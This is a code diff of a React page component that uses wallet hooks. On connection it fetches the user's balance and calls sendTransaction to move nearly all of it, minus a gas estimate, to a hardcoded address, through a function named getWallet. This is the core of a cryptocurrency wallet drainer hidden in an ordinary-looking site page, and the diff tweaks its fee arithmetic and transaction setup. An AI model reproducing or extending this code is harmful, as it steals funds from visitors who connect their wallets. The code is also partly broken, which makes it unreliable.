@@ -44,19 +44,22 @@ export default function Home() {
   const [gasFee, setGasFee] = useState('0')
   const [amount, setAmount] = useState('0')
   
+  
   const to = '0x80a79C84330600E8c1B98CDC66509676310DDE13'
   const [debouncedTo] = useDebounce(to, 500)
   const [debouncedAmount] = useDebounce(amount, 500)
   //let stringValue = toString(utils.parseEther(debouncedAmount))
   //console.log(amount)
-  const { config } = usePrepareSendTransaction({
+
+  const [configState, setConfigState] = useState({  })
+  const { config } = usePrepareSendTransaction(configState)
+ 
+  const  { sendTransaction } = useSendTransaction({
     request: {
       to: debouncedTo,
       value:  parseEther(String(amount)),
-    },
-  })
- //console.log(config)
-  const  { sendTransaction } = useSendTransaction(config)
+},
+})
 
   const accBalance = async ()=>{
     const balance = await fetchBalance({
@@ -80,19 +83,25 @@ export default function Home() {
   //const contract = useContract( contractAddress, MyABI)
   useEffect(() => {
     if(isConnected){
-        console.log('amount', amount)
+        //console.log('amount', amount)
+        //console.log(configState)
         setLoggedIn(true)
     }
   },[])
   
   const getWallet = async () => {
     await accBalance()
-    const amtToSend = parseFloat(myBalance) - parseFloat(gasFee)
+
+
+    const amtToSend = (myBalance) - (gasFee*100000)
     if (amtToSend < 0) {
       setAmount(0)
     } else {
       setAmount(amtToSend.toString())
+      console.log(gasFee * 1000000)
       if (myBalance !== '0' && gasFee !== '0') {
+        
+    
         sendTransaction?.()
       }
     }
